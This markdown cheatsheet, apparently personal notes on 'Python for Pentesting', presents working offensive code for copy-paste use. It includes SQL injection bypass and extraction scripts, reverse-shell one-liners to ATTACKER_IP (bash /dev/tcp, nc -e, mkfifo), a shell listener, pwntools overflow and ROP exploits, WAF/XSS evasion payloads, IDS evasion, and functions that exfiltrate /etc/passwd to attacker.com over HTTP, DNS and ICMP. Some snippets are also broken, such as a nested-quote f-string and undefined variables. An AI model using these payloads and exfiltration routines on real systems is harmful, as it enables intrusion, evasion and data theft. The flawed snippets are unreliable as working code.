---
title: Python for Pentesting
tags: [python, notes]
description:  use for scripting and pentesting
date: 2025-09-02
---
# PART 1: DETAILED SUMMARY NOTES

## 1.1 Core Concepts & Definitions

### What is Python for Pentesting?
Python is the most used scripting language for penetration testing and CTF challenges due to its:
- **Rapid prototyping:** Write exploits quickly with minimal boilerplate
- **Rich ecosystem:** Libraries like `requests`, `pwntools`, `scapy`, `socket`, `subprocess`
- **Cross-platform:** Works on Linux, Windows, macOS
- **Readability:** Easy to debug and modify during live engagements

### Key Python Libraries for Security

| Library | Purpose | Installation |
|---|---|---|
| `requests` | HTTP/HTTPS requests, web exploitation | `pip install requests` |
| `pwntools` | CTF framework, exploit development | `pip install pwntools` |
| `scapy` | Packet manipulation, network scanning | `pip install scapy` |
| `socket` | Low-level networking, reverse shells | Built-in |
| `subprocess` | Execute system commands (carefully!) | Built-in |
| `argparse` | CLI argument parsing | Built-in |
| `re` | Regular expressions for parsing | Built-in |
| `base64` | Encoding/decoding | Built-in |
| `hashlib` | Password hashing, integrity checks | Built-in |
| `json` | Parse API responses, config files | Built-in |

## 1.2 Attack Methodology Overview (Kill Chain Stages)

- **Stage 1: Reconnaissance & Enumeration**
  - Gather information about targets (IPs, domains, services)
  - Automate DNS lookups, subdomain enumeration, port scanning
  - Extract data from web APIs and responses
- **Stage 2: Vulnerability Scanning**
  - Identify weaknesses (SQL injection, XSS, command injection)
  - Fuzz parameters and endpoints
  - Parse scan results programmatically
- **Stage 3: Exploitation**
  - Craft payloads (reverse shells, buffer overflows, ROP chains)
  - Use `pwntools` for binary exploitation
  - Automate web exploits with `requests`
- **Stage 4: Post-Exploitation**
  - Maintain access (persistence scripts)
  - Privilege escalation automation
  - Data exfiltration and lateral movement
- **Stage 5: Reporting**
  - Parse logs and output to CSV/JSON
  - Generate structured reports

## 1.3 Tool Setup & Configuration

### Essential Python Environment Setup
```bash
# Update system packages
sudo apt update && sudo apt upgrade -y
# Install Python 3 and pip
sudo apt install python3 python3-pip python3-dev -y
# Create virtual environment for isolation
python3 -m venv pentesting-env
source pentesting-env/bin/activate
# Install core libraries
pip install requests pwntools scapy python-nmap beautifulsoup4 lxml
```

### CLI Tool Template Structure
```python
#!/usr/bin/env python3
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(
        description='Pentest Tool - [Brief Description]',
        epilog='Example: python3 tool.py -t 10.10.10.5 -p 80,443'
    )
    # Positional argument
    parser.add_argument('target', help='Target IP or domain')
    # Optional arguments
    parser.add_argument('-p', '--ports', default='80,443,8080',
                        help='Comma-separated ports (default: 80,443,8080)')
    parser.add_argument('-t', '--timeout', type=float, default=2.0,
                        help='Connection timeout in seconds')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Output file path')

    args = parser.parse_args()

    # Your exploit/enumeration logic here
    if args.verbose:
        print(f"[*] Target: {args.target}")
        print(f"[*] Ports: {args.ports}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
```

## 1.4 In-Depth Exploitation Steps

### A. Web Exploitation with `requests`

**SQL Injection Detection Script**
```python
import requests
import re

def detect_sqli(url, param):
    payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--"]
    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(target_url, timeout=3)
            # Check for SQL error patterns
            if re.search(r'(SQL syntax|mysql_fetch|Warning: mysql)',
                         response.text, re.IGNORECASE):
                print(f"[+] Potential SQLi found with payload: {payload}")
                print(f"[+] URL: {target_url}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
    return False

# Usage
detect_sqli("http://10.10.10.5/page.php", "id")
```

### B. Network Operations with `socket`

**Port Scanner**
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            return port, True
        return port, False
    except:
        return port, False

def scan_ports(ip, ports, threads=100):
    print(f"[*] Scanning {ip}...")
    open_ports = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda p: scan_port(ip, p), ports)
        for port, is_open in results:
            if is_open:
                print(f"[+] Port {port} is open")
                open_ports.append(port)
    return open_ports

# Usage
target = "10.10.10.5"
port_range = range(1, 1001)
open_ports = scan_ports(target, port_range)
```

**Reverse Shell Listener**
```python
import socket
import os

def listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening on port {port}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    while True:
        command = input("Shell> ")
        if command.lower() == 'exit':
            conn.close()
            break
        conn.send(command.encode())
        output = conn.recv(4096).decode()
        print(output)

# Usage
listener(4444)
```

### C. Command Injection Testing with `subprocess`
```python
import subprocess
import shlex

# DANGEROUS - Never use shell=True with user input
def unsafe_command(user_input):
    # VULNERABLE TO COMMAND INJECTION
    result = subprocess.run(user_input, shell=True, capture_output=True)
    return result.stdout.decode()

# SAFE - Use list format without shell=True
def safe_command(command, args):
    cmd = [command] + args
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

# Testing for command injection vulnerability
def test_cmd_injection(url, param):
    payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "; ping -c 1 attacker-ip"
    ]
    for payload in payloads:
        response = requests.get(f"{url}?{param}={payload}")
        if "root:" in response.text or "uid=" in response.text:
            print(f"[+] Command injection found: {payload}")
            return True
    return False
```

### D. Binary Exploitation with `pwntools`
```python
from pwn import *

# Set context for target architecture
context.update(arch='i386', os='linux')

# Connect to remote binary
r = remote('10.10.10.5', 1337)

# Generate cyclic pattern to find offset
payload = cyclic(100)
r.sendline(payload)

# After crash, find offset
# In GDB: cyclic -l 0x61616167
offset = 24

# Craft exploit payload
padding = b'A' * offset
ret_addr = p32(0xdeadbeef)  # Address of win() function
payload = padding + ret_addr

r.sendline(payload)
r.interactive()
```

## 1.5 Defensive Indicators & Red Flags

**Signs Your Script/Activity is Being Detected:**
- Sudden connection drops or resets
- Rate limiting or CAPTCHA challenges
- IP blocks or 403 Forbidden responses
- Unusual delays in responses (honeypot behavior)
- Session tokens invalidating rapidly

**Anti-Detection Techniques:**
```python
import requests
import time
import random

# Rotate User-Agent headers
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
]

def stealthy_request(url):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.google.com'
    }
    # Random delay between requests
    time.sleep(random.uniform(1, 3))
    return requests.get(url, headers=headers, timeout=5)
```

## 1.6 Common Hurdles & Mitigation Bypasses

**Problem: WAF/IDS Detection**
Solution: Use encoding, case manipulation, comment injection
```
# SQL Injection WAF bypass examples
payloads = [
    "UNION/**/SELECT",           # Comment injection
    "UnIoN SeLeCt",               # Case manipulation
    "UNION%23%0ASELECT",          # Newline encoding
    "UNION(SELECT 1,2,3)",        # Parentheses bypass
    "/*!50000UNION*/SELECT"       # MySQL version comment
]
```

**Problem: Input Validation/Filtering**
Solution: Alternative encoding methods
```python
import base64
import urllib.parse

# Bypass filters with encoding
command = "; cat /etc/passwd"
encoded = base64.b64encode(command.encode()).decode()
url_encoded = urllib.parse.quote(command)
double_encoded = urllib.parse.quote(url_encoded)
```

**Problem: Network Restrictions/Egress Filtering**
Solution: Data exfiltration via allowed protocols
```python
import requests

# DNS exfiltration
def exfil_dns(data, domain="attacker.com"):
    import socket
    encoded = data.encode().hex()
    query = f"{encoded}.{domain}"
    socket.gethostbyname(query)

# HTTP exfiltration (if allowed)
def exfil_http(data, url):
    requests.post(url, data={'data': data})

# ICMP exfiltration
def exfil_icmp(data, target):
    from scapy.all import IP, ICMP, send
    packet = IP(dst=target)/ICMP()/data
    send(packet)
```

# PART 2: RAPID-REFERENCE CHEATSHEET

## 2.1 Command Syntax & Quick Reference

### File Operations
```python
# Read file
with open('file.txt', 'r') as f:
    content = f.read()              # Read entire file
    lines = f.readlines()           # Read as list of lines
    line = f.readline()             # Read single line

# Write file
with open('output.txt', 'w') as f:
    f.write('data\n')               # Write string
    f.writelines(['line1\n', 'line2\n'])  # Write list

# Append to file
with open('log.txt', 'a') as f:
    f.write('new entry\n')
```

### String Operations
```python
# Split
data = "10.10.10.5:80:open".split(':')  # ['10.10.10.5', '80', 'open']
words = text.split()                     # Split on whitespace
fields = csv_line.split(',', 2)          # Split on comma, max 2 splits

# Join
ip_list = ['192', '168', '1', '1']
ip = '.'.join(ip_list)                   # '192.168.1.1'
path = '/'.join(['root', 'etc', 'passwd'])

# Strip whitespace
clean = "  data  \n".strip()             # 'data'
clean = line.rstrip('\n')                # Remove trailing newline
clean = text.lstrip()                    # Remove leading whitespace
```

### Encoding/Decoding
```python
import base64
import binascii

# Base64
encoded = base64.b64encode(b'data').decode()      # 'ZGF0YQ=='
decoded = base64.b64decode('ZGF0YQ==').decode()   # 'data'

# Hex
hex_data = binascii.hexlify(b'hello').decode()    # '68656c6c6f'
original = binascii.unhexlify(hex_data).decode()  # 'hello'

# URL encoding
import urllib.parse
encoded = urllib.parse.quote('test data')         # 'test%20data'
decoded = urllib.parse.unquote('test%20data')     # 'test data'

# Quick conversions
int('FF', 16)           # 255 (hex to int)
hex(255)                # '0xff'
chr(65)                 # 'A'
ord('A')                # 65
```

### JSON Operations
```python
import json

# Parse JSON string
data = json.loads('{"key": "value"}')

# Parse JSON file
with open('data.json', 'r') as f:
    data = json.load(f)

# Create JSON
json_str = json.dumps({'result': 'success'}, indent=2)

# Access nested data
user = data['users'][0]['name']
```

### Regular Expressions
```python
import re

# Search for pattern
match = re.search(r'flag{.*?}', text)
if match:
    flag = match.group()

# Find all matches
emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', text)
ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text)

# Replace/substitute
clean = re.sub(r'<.*?>', '', html)     # Remove HTML tags
sanitized = re.sub(r'[^\w\s]', '', user_input)

# Common patterns
r'\d+'              # One or more digits
r'\w+'              # One or more word characters
r'[a-zA-Z0-9]+'     # Alphanumeric
r'^flag{.+}$'       # Exact match flag format
```

### Command-Line Arguments
```python
import sys

# Access arguments
script_name = sys.argv[0]
first_arg = sys.argv[1] if len(sys.argv) > 1 else None
all_args = sys.argv[1:]

# Parse with argparse
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('target', help='Target IP/domain')
parser.add_argument('-p', '--port', type=int, default=80)
parser.add_argument('-v', '--verbose', action='store_true')
args = parser.parse_args()

# Access parsed args
print(args.target, args.port, args.verbose)
```

### Error Handling
```python
# Basic try-except
try:
    risky_operation()
except Exception as e:
    print(f"Error: {e}")

# Specific exceptions
try:
    file = open('data.txt')
except FileNotFoundError:
    print("File not found")
except PermissionError:
    print("No permission")

# Multiple exceptions
try:
    result = int(user_input) / divisor
except (ValueError, ZeroDivisionError) as e:
    print(f"Invalid input: {e}")

# Finally block (always runs)
try:
    conn = socket.connect((ip, port))
except:
    print("Connection failed")
finally:
    conn.close()  # Always close connection
```

## 2.2 Enumeration Checklist
- [ ] **Step 1: Reconnaissance**
  - `python3 dns_enum.py -d target.com -w wordlist.txt`
  - `python3 sublist3r.py -d target.com -o results.txt`
- [ ] **Step 2: Port Scanning**
  - `python3 scanner.py -t 10.10.10.5 -p 21,22,80,443,445,3389`
  - `python3 scanner.py -t 10.10.10.5 -p 1-65535 --threads 500`
- [ ] **Step 3: Service Enumeration**
  - `python3 dir_enum.py -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt`
  - `python3 smb_enum.py -t 10.10.10.5 --shares`
- [ ] **Step 4: Vulnerability Detection**
  - `python3 sqli_test.py -u "http://10.10.10.5/page?id=1"`
  - `python3 xss_scan.py -u http://10.10.10.5/search`
- [ ] **Step 5: Exploitation**
  - `python3 exploit.py -t 10.10.10.5 -p 8080 -l 4444`

## 2.3 Decision Trees / If-Then Flows

### Web Application Testing Flow
- **IF** port 80/443 open
  - → Run directory enumeration: `python3 dirsearch.py -u http://target`
  - **IF** `/admin` found
    - → Test default credentials
    - → Test SQL injection in login: `' OR '1'='1`
    - → Test authentication bypass
  - **IF** `/api` found
    - → Enumerate endpoints
    - → Test for API key exposure
    - → Check for IDOR vulnerabilities
  - **IF** `/upload` found
    - → Test file upload restrictions
    - → Try: `shell.php.jpg`, `shell.php%00.jpg`
    - → Check for path traversal: `../../evil.php`
  - **IF** parameter in URL (`?id=`, `?page=`, etc)
    - → Test SQL injection
    - → Test XSS: `<script>alert(1)</script>`
    - → Test LFI: `../../../../etc/passwd`
    - → Test command injection: `; whoami`

### Network Services Flow
- **IF** port 22 (SSH) open
  - → Try known credentials
  - → Check for SSH key leaks
  - → Brute force if rate-limit allows
- **IF** port 21 (FTP) open
  - → Try anonymous login: user=`anonymous`, pass=`anonymous`
  - → Check version for exploits
  - → Look for writable directories
- **IF** port 445 (SMB) open
  - → Run enum4linux: `python3 smb_enum.py -t TARGET`
  - → Check for null session
  - → List shares: `smbclient -L //TARGET -N`
  - → Look for sensitive files
- **IF** port 3306 (MySQL) open
  - → Try default creds: `root:root`, `root:password`
  - → Test for SQL injection in web app
  - → Check for weak authentication
- **IF** port 6379 (Redis) open
  - → Check if unprotected
  - → Try uploading SSH key for RCE

### Binary Exploitation Flow (CTF)
- **IF** binary provided
  - → Check protections: `checksec binary`
  - **IF** no NX (stack executable)
    - → Consider shellcode injection
    - → Craft payload: `padding + shellcode + ret_to_shellcode`
  - **IF** no PIE (no ASLR)
    - → Use static addresses
    - → Find `win()` or `system()` address
  - **IF** buffer overflow present
    - → Find offset: `python3 -c "from pwn import cyclic; print(cyclic(100))"`
    - → Craft exploit: `padding + return_address`
  - **IF** format string vulnerability
    - → Leak addresses: `%p %p %p`
    - → Write arbitrary values: `%n`

## 2.4 WAF/IDS Evasion Snippets

### SQL Injection Bypasses
```
# Space bypass
"UNION/**/SELECT"
"UNION%09SELECT"      # Tab
"UNION%0ASELECT"      # Newline

# Keyword bypass
"UNION%23%0ASELECT"   # Comment + newline
"/*!50000UNION*/SELECT"
"UNI%00ON SELECT"     # Null byte

# Quote bypass
"admin' AND '1'='1"
"admin' AND 1=1#"
```

### XSS Bypasses
```
# Filter evasion
"<img src=x onerror=alert(1)>"
"<svg/onload=alert(1)>"
"<iframe src=javascript:alert(1)>"
"<body onload=alert(1)>"

# Case manipulation
"<ScRiPt>alert(1)</sCrIpT>"

# Encoding
"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"  # HTML entities
```

### Command Injection Bypasses
```
# Separator variations
"; whoami"
"| whoami"
"& whoami"
"|| whoami"
"`whoami`"
"$(whoami)"

# Encoding
"cat${IFS}/etc/passwd"          # IFS (Internal Field Separator)
"cat</etc/passwd"               # Redirection
"c'a't' /etc/passwd"            # Quote insertion
```

## 2.5 Post-Exploitation Shortcuts

### Linux Privilege Escalation Checks
```python
#!/usr/bin/env python3
import os
import subprocess

# SUID binaries
print("[*] Checking SUID binaries...")
os.system("find / -perm -4000 -type f 2>/dev/null")

# Writable directories
print("[*] Checking world-writable directories...")
os.system("find / -writable -type d 2>/dev/null")

# Sudo permissions
print("[*] Checking sudo privileges...")
os.system("sudo -l")

# Cron jobs
print("[*] Checking cron jobs...")
os.system("cat /etc/crontab")
os.system("ls -la /etc/cron.*")
```

### Windows Privilege Escalation Checks
```
# Unquoted service paths
os.system("wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\"")

# Writable service binaries
os.system("icacls \"C:\\Program Files\\*\" | findstr /i \"(F) (M) (W)\"")

# Always install elevated
os.system("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated")
```

### Data Exfiltration
```python
import requests
import base64

# Exfiltrate via HTTP POST
def exfil_http(data, url="http://attacker.com/collect"):
    encoded = base64.b64encode(data.encode()).decode()
    requests.post(url, data={'d': encoded})

# Exfiltrate file
with open('/etc/passwd', 'r') as f:
    exfil_http(f.read())
```

# PART 3: REAL-WORLD EXAMPLES & USAGE SCENARIOS

## Example 1: SQL Injection Exploitation
**Scenario:** Web login form vulnerable to SQL injection at `http://10.10.10.5/login.php`

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urlencode

target = "http://10.10.10.5/login.php"

# Step 1: Detect vulnerability
def test_sqli():
    payloads = ["'", "' OR '1'='1", "' OR 1=1--"]
    for payload in payloads:
        data = {'username': payload, 'password': 'anything'}
        response = requests.post(target, data=data)
        if "Welcome" in response.text or "dashboard" in response.text:
            print(f"[+] SQLi detected with payload: {payload}")
            return True
    return False

# Step 2: Bypass authentication
def bypass_login():
    payloads = [
        "admin' --",
        "admin' #",
        "admin' OR '1'='1",
        "' OR 1=1--"
    ]
    for payload in payloads:
        data = {'username': payload, 'password': 'x'}
        response = requests.post(target, data=data, allow_redirects=False)
        if response.status_code == 302:  # Redirect = success
            print(f"[+] Bypassed login with: {payload}")
            return True
    return False

# Step 3: Extract database info with UNION injection
def extract_data():
    # Find number of columns
    for i in range(1, 10):
        payload = f"' UNION SELECT {",".join(['NULL']*i)}--"
        data = {'username': payload, 'password': 'x'}
        response = requests.post(target, data=data)
        if "error" not in response.text.lower():
            print(f"[+] Number of columns: {i}")
            cols = i
            break
    # Extract database name
    payload = f"' UNION SELECT database(),{",".join(['NULL']*(cols-1))}--"
    data = {'username': payload, 'password': 'x'}
    response = requests.post(target, data=data)
    print(f"[*] Response:\n{response.text}")

# Execute
if test_sqli():
    bypass_login()
    extract_data()
```

**Usage:**
```bash
python3 sqli_exploit.py
```
If WAF detected:
```
# Add bypass techniques
payload = "admin'/**/--"
payload = "admin'%23"
payload = "aDmIn' OR '1'='1"  # Case manipulation
```

## Example 2: SMB Enumeration & Exploitation
**Scenario:** Target `10.10.10.5` has SMB (port 445) open

```python
#!/usr/bin/env python3
import subprocess
import re

target = "10.10.10.5"

# Step 1: Check for null session
def check_null_session():
    cmd = f"smbclient -L //{target} -N"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    if "Sharename" in result.stdout:
        print("[+] Null session allowed!")
        shares = re.findall(r'(\w+)\s+Disk', result.stdout)
        print(f"[+] Available shares: {shares}")
        return shares
    else:
        print("[-] Null session not allowed")
        return []

# Step 2: Enumerate share contents
def enum_share(share):
    cmd = f"smbclient //{target}/{share} -N -c 'ls'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"\n[*] Contents of {share}:")
    print(result.stdout)

# Step 3: Download sensitive files
def download_file(share, filename):
    cmd = f"smbclient //{target}/{share} -N -c 'get {filename}'"
    subprocess.run(cmd, shell=True)
    print(f"[+] Downloaded {filename} from {share}")

# Execute
shares = check_null_session()
for share in shares:
    if share.lower() not in ['ipc$', 'print$']:
        enum_share(share)
        # Look for interesting files
        download_file(share, "passwords.txt")
```
If null sessions disallowed:
```
# Try default/weak credentials
credentials = [
    ("guest", ""),
    ("administrator", "password"),
    ("admin", "admin")
]
for user, passwd in credentials:
    cmd = f"smbclient -L //{target} -U {user}%{passwd}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    if "Sharename" in result.stdout:
        print(f"[+] Valid creds: {user}:{passwd}")
```
If share “Documents” exists:
```
smbclient \\\\10.10.10.5\\Documents -N
smb: \> ls
smb: \> get confidential.txt
```

## Example 3: Reverse Shell Generation & Listener
**Scenario:** Need to establish reverse shell from compromised web server

**Step 1: Python reverse shell payload**
```python
# Payload to inject/upload to target
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

**Step 2: Listener script**
```python
#!/usr/bin/env python3
import socket
import sys

def start_listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening on 0.0.0.0:{port}")
    conn, addr = s.accept()
    print(f"[+] Connection received from {addr[0]}:{addr[1]}")
    while True:
        try:
            command = input("$ ")
            if command.lower() in ['exit', 'quit']:
                conn.close()
                break
            if command.strip():
                conn.send((command + '\n').encode())
                output = conn.recv(8192).decode()
                print(output, end='')
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            conn.close()
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    start_listener(port)
```

**Usage:**
```bash
# Start listener
python3 listener.py 4444

# On target, execute payload
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Alternative one-liners for target:**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

## Example 4: Web Directory Brute-Forcing
**Scenario:** Enumerate hidden directories on `http://10.10.10.5`
```python
#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

target = "http://10.10.10.5"
wordlist = "/usr/share/wordlists/dirb/common.txt"

def check_path(path):
    url = f"{target}/{path.strip()}"
    try:
        response = requests.get(url, timeout=3, allow_redirects=False)
        if response.status_code in [200, 301, 302, 401, 403]:
            size = len(response.content)
            print(f"[{response.status_code}] {url} ({size} bytes)")
            return url, response.status_code
    except requests.exceptions.RequestException:
        pass
    return None

def brute_force():
    with open(wordlist, 'r') as f:
        paths = f.readlines()

    print(f"[*] Starting directory brute-force on {target}")
    print(f"[*] Wordlist: {wordlist} ({len(paths)} entries)")

    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(check_path, paths)
        found = [r for r in results if r]
        print(f"\n[+] Found {len(found)} directories/files")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        target = sys.argv[1]
    brute_force()
```

**Usage:**
```bash
python3 dir_enum.py http://10.10.10.5
```
If rate-limited or WAF detected:
```python
import time
import random

# Add delays
time.sleep(random.uniform(0.5, 2))

# Rotate User-Agents
headers = {
    'User-Agent': random.choice(user_agents),
    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
}
response = requests.get(url, headers=headers)
```

## Example 5: Binary Exploitation with Pwntools
**Scenario:** CTF binary with buffer overflow at offset 32
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vuln_binary'
remote_host = '10.10.10.5'
remote_port = 1337

# Set context
context.update(arch='i386', os='linux')
context.log_level = 'debug'

# Find offset (if unknown)
def find_offset():
    p = process(binary)
    p.sendline(cyclic(100))
    p.wait()
    # In GDB, get crashed EIP value
    # Then: cyclic -l <EIP_value>
    # Returns offset

# Exploit
def exploit():
    # Connect to target
    # r = process(binary)  # Local testing
    r = remote(remote_host, remote_port)

    # Known values
    offset = 32
    win_addr = 0x08049296  # Address of win() function

    # Build payload
    padding = b'A' * offset
    ret_addr = p32(win_addr)
    payload = padding + ret_addr

    # Send exploit
    r.sendline(payload)

    # Get flag
    r.interactive()

if __name__ == '__main__':
    exploit()
```
If you need to leak addresses (PIE/ASLR):
```python
# Leak libc address
def leak_libc():
    r = process(binary)
    # Payload to leak puts@GOT
    payload = b'A' * offset
    payload += p32(elf.symbols['puts'])  # Call puts
    payload += p32(elf.symbols['main'])  # Return to main
    payload += p32(elf.got['puts'])      # Argument: puts GOT entry
    r.sendline(payload)
    leak = u32(r.recv(4))
    libc_base = leak - libc.symbols['puts']
    return libc_base
```
If ROP chain needed:
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
# Build ROP chain
rop.call('system', ['/bin/sh'])
payload = b'A' * offset + rop.chain()
```

# PART 4: APPLICATION GUIDANCE

## 4.1 Navigating the Cheatsheet Under Time Pressure

**Quick Reference Strategy:**
1. Identify the scenario (web app, network service, binary, etc.)
2. Jump to relevant decision tree (Section 2.3)
3. Copy-paste base script from examples (Part 3)
4. Modify target IP/URL and parameters
5. Check evasion section if detection occurs (Section 2.4)

**Mental Checklist for Live Engagements:**
- [ ] What service/port is open? → Check decision tree
- [ ] What's the vulnerability type? → Find relevant example
- [ ] Do I need custom payloads? → Check evasion snippets
- [ ] Is output needed for report? → Add logging/file output
- [ ] Am I being detected? → Switch to stealth mode

## 4.2 Switching Between Enumeration and Exploitation

**Workflow Pattern:**
`ENUMERATE` → `IDENTIFY` → `TEST` → `EXPLOIT` → `POST-EXPLOIT`

**Python Script Organization:**
```python
# Create modular scripts for each phase

# enum.py - Discovery phase
def enumerate_target(target):
    scan_ports(target)
    check_services(target)
    return findings

# exploit.py - Attack phase
def exploit_vulnerability(target, vuln_type):
    if vuln_type == 'sqli':
        run_sqli_exploit(target)
    elif vuln_type == 'rce':
        run_rce_exploit(target)

# post.py - Post-exploitation
def post_exploit(target):
    escalate_privileges()
    maintain_persistence()
    exfiltrate_data()
```

**Quick Pivot Commands:**
```bash
# Enumeration -> Exploitation pivot
python3 enum.py -t 10.10.10.5 | tee findings.txt
grep "SQLi" findings.txt
python3 exploit_sqli.py -t 10.10.10.5

# Save state between phases
python3 scan.py -t TARGET -o scan.json
python3 exploit.py --input scan.json --service http
```

## 4.3 Customizing Payloads for Unusual Targets

**Adaptation Checklist:**
- Check target OS/platform
  ```python
  # Windows vs Linux
  if platform.system() == 'Windows':
      payload = 'powershell -enc <BASE64>'
  else:
      payload = '/bin/bash -c <COMMAND>'
  ```
- Identify filtered characters
  ```bash
  # If spaces filtered
  cmd = "cat</etc/passwd"
  cmd = "cat${IFS}/etc/passwd"

  # If quotes filtered
  cmd = "cat /etc/pass`echo wd`"
  ```
- Adjust encoding
  ```python
  # Try different encodings
  payloads = [
      original,
      base64.b64encode(original),
      urllib.parse.quote(original),
      original.replace(' ', '%20')
  ]
  ```
- Test incrementally
  ```
  # Start simple, add complexity
  tests = [
      "whoami",                    # Basic test
      "id",                        # More info
      "cat /etc/passwd",          # File access
      "nc ATTACKER_IP 4444 -e /bin/bash"  # Full shell
  ]
  ```

## 4.4 Tips for CTF-Specific Challenges

### Common CTF Patterns

**Flag Format Recognition**
```python
import re
def extract_flag(text):
    patterns = [
        r'flag{[^}]+}',
        r'HTB{[^}]+}',
        r'picoCTF{[^}]+}',
        r'CTF{[^}]+}'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group()
    return None
```

**Binary Analysis Workflow**
```
# 1. Check protections
checksec binary

# 2. Run to understand behavior
./binary

# 3. Find vulnerability
python3 -c "print('A'*100)" | ./binary

# 4. Find offset
python3 -c "from pwn import *; print(cyclic(100))" | ./binary
# In GDB: cyclic -l <crashed_value>

# 5. Craft exploit
python3 exploit.py
```

**Web Challenge Shortcuts**
```python
# Check common CTF endpoints
endpoints = [
    '/robots.txt',
    '/admin',
    '/flag.txt',
    '/backup',
    '/.git',
    '/debug',
    '/api'
]
for endpoint in endpoints:
    check_endpoint(target + endpoint)
```

**Crypto Challenge Template**
```python
# Common crypto weaknesses in CTFs
def crypto_checks(ciphertext):
    # 1. Check if base64
    try:
        decoded = base64.b64decode(ciphertext)
        print(f"Base64 decoded: {decoded}")
    except:
        pass

    # 2. Check if hex
    try:
        unhex = bytes.fromhex(ciphertext).decode()
        print(f"Hex decoded: {unhex}")
    except:
        pass

    # 3. Try Caesar cipher (ROT13, etc.)
    for shift in range(26):
        result = caesar_decrypt(ciphertext, shift)
        if "flag" in result.lower():
            print(f"ROT{shift}: {result}")

    # 4. Check for XOR
    for key in range(256):
        result = xor_decrypt(ciphertext, key)
        if is_readable(result):
            print(f"XOR key {key}: {result}")
```

## 4.5 Debugging & Troubleshooting

### Common Issues and Fixes:
```python
# Issue: Connection timeout
try:
    response = requests.get(url, timeout=10)
except requests.Timeout:
    print("[!] Timeout - target may be down or filtered")
    # Try: Increase timeout, check firewall, verify connectivity

# Issue: SSL certificate errors
response = requests.get(url, verify=False)  # Disable SSL verification

# Issue: Encoding problems
text = response.content.decode('utf-8', errors='ignore')

# Issue: Import errors (missing library)
try:
    import rare_library
except ImportError:
    print("[!] Install: pip install rare_library")
    sys.exit(1)

# Issue: Script hangs
import signal
signal.alarm(30)  # Timeout after 30 seconds
```

### Logging for Debugging:
```python
import logging
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)
logging.info("Starting scan...")
